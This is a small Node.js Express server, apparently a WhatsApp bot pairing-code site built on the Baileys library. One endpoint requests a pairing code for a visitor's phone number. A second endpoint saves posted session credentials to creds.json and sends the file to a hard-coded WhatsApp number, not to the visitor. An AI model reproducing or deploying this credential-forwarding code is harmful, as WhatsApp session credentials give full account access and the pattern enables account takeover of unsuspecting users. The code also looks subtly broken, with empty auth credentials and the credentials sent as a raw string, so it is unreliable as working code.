// index.js

const express = require('express');
const bodyParser = require('body-parser');
const { makeWASocket } = require("@whiskeysockets/baileys");
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

const XeonBotInc = makeWASocket({
    auth: {
        creds: {}, // Provide credentials if available
    },
});

// Serve static files from the 'public' directory
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

// Handle pairing code generation
app.post('/generate-code', async (req, res) => {
    const phoneNumber = req.body.phoneNumber;

    if (!phoneNumber) {
        return res.status(400).send('Phone number is required');
    }

    try {
        // Request a pairing code
        const code = await XeonBotInc.requestPairingCode(phoneNumber);
        res.send(code);
    } catch (error) {
        console.error("Error requesting pairing code:", error);
        res.status(500).send('Error generating pairing code');
    }
});

// Handle receiving creds.json file
app.post('/receive-creds', async (req, res) => {
    const { creds } = req.body;

    // Save creds.json file
    fs.writeFile('creds.json', creds, async (err) => {
        if (err) {
            console.error("Error saving creds.json:", err);
            return res.status(500).send('Error saving creds.json');
        }

        // Send creds.json file to WhatsApp
        try {
            await XeonBotInc.sendMessage('916238768108', { document: creds, mimetype: 'application/json', fileName: 'creds.json' });
            res.send('creds.json sent to WhatsApp successfully');
        } catch (error) {
            console.error("Error sending creds.json to WhatsApp:", error);
            res.status(500).send('Error sending creds.json to WhatsApp');
        }
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
        
